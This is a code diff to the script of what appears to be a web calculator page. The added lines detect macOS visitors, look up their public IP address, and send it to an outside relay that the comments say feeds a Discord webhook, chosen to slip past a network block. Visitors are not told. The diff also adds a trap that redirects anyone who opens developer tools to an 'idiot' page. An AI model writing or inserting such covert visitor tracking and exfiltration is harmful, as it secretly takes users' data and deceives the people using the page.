@@ -92,16 +92,50 @@
                 display.value = 'Error';
             }
         }
+        
+        function getOS() {
+            const platform = window.navigator.platform;
+
+            if (platform.includes('Win')) return 'Windows';
+            if (platform.includes('Mac')) return 'macOS';
+            if (platform.includes('Linux')) return 'Linux';
+            if (platform.includes('iPhone') || platform.includes('iPad')) return 'iOS';
+            if (platform.includes('Android')) return 'Android';
+
+            return 'Unknown OS';
+        }
+        const os = getOS();
+        if (os === 'macOS') {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                 console.log('User IP Address:', data.ip);
+                    fetch('https://sura.lol/api/66efca19d42b7', {      // if the user is using macOS, send ip address to
+                    method: 'POST',                                    // a discord webhook, since discord is blocked on the
+                    headers: {                                         // network, a webhook protector is used to unblock the
+                        'Content-Type': 'application/json'             // webhook and pervent abuse
+                    },
+                    body: JSON.stringify({
+                        content: data.ip,
+                        username: "Captain Hook"
+                })
+            });
+    })
+    .catch(error => console.error('Error fetching IP address:', error));
+
+        }
+        
         let lastWidth = window.innerWidth;
         let lastHeight = window.innerHeight;
 
         setInterval(() => {
             if (window.innerWidth !== lastWidth || window.innerHeight !== lastHeight) {
-            console.log('looks like someone opened the console, or so i think :P');
+            console.log('I can see you');
             lastWidth = window.innerWidth;
             lastHeight = window.innerHeight;
-            window.location.href = "/idiot/index.html";
-            }
+            alert("dont do that.");
+            window.location.href = "/idiot/index.html";             // if they open inspect element and click the window, it will open
+            }                                                       // you are a idiot
         }, 1000);
     </script>
 </body>
